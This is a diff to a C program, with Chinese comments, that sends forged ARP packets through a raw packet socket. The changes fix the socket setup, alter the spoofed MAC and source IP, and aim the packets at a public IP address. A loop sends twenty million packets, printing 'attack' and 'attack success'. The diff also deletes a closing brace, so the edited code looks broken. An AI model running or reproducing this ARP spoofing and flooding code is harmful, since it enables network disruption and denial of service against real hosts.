@@ -10,6 +10,7 @@
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/if_ether.h>
+#include <linux/if_packet.h>
 #include <net/if_arp.h>
 //#include <netpacket/packet.h>
 #include <net/if.h>
@@ -285,7 +286,7 @@ void set_hw_addr (char buf[], char *str)
 /* 主函数 */
 int main(int argc,char *argv[])
 {
-	unsigned char srcMacAddress[6] = {0x00,0x0C,0x29,0x46,0xB3,0x50};
+	unsigned char srcMacAddress[6] = {0x00,0x0C,0x29,0x46,0xB3,0x49};
 
 	unsigned char dstMacAddress[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
@@ -339,7 +340,7 @@ int main(int argc,char *argv[])
 
 	int fd;
 
-	fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
+	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 
 	if(fd < 0){
 		perror("socket open error!\n");
@@ -348,11 +349,26 @@ int main(int argc,char *argv[])
 		printf("socket open success!\n");
 	}
 
-	struct sockaddr sa;
+	//struct sockaddr sa;
+	struct sockaddr_ll sa;
 
 	memset(&sa, 0, sizeof(struct sockaddr));
+	
+	sa.sll_family = AF_PACKET;
 
-	strcpy(sa.sa_data,"eth0");
+	struct ifreq req;
+
+	bzero(&req, sizeof(struct ifreq));
+
+	strcpy(req.ifr_name,"eth0");
+
+	if(ioctl(fd,SIOCGIFINDEX,&req) != 0){
+		perror("ioctl error");
+		exit(1);
+	}
+	sa.sll_ifindex = req.ifr_ifindex;
+	sa.sll_protocol = htons(ETH_P_ARP);
+	//strcpy(sa.sa_data,"eth0");
 
 	char buf[60];
 
@@ -362,9 +378,9 @@ int main(int argc,char *argv[])
 
 	/* in address struct */
 
-	unsigned char sou_ip_addr[4] = {192,168,8,138};
+	unsigned char sou_ip_addr[4] = {192,168,8,223};
 
-	unsigned char des_ip_addr[4] = {192,168,8,138};
+	unsigned char des_ip_addr[4] = {112,65,235,59};
 
 	struct in_addr src_addr,des_addr;
 
@@ -396,7 +412,7 @@ int main(int argc,char *argv[])
 	   fclose(logfile);	
 	   */
 	for(i=0;i<20000000;i++){
-		result = sendto(fd, buf, sizeof(buf), 0, &sa, sizeof(sa));
+		result = sendto(fd, buf, sizeof(buf), 0,(struct sockaddr *)&sa, sizeof(sa));
 
 		printf("attack %s\n!!\n", (char *)des_ip_addr);
 
@@ -407,16 +423,6 @@ int main(int argc,char *argv[])
 		}else{
 			printf("attack success \n");
 		}
-	}
-	/**
-	 * in_addr IPv4地址结构体
-	 *
-	 * inet_ntop();
-	 *
-	 * inet_pton();
-	 *
-	 * ip格式转换函数的使用
-	 */
 	char IPdotdec[20]; //存放点分十进制IP地址
 	struct in_addr s; // IPv4地址结构体
 
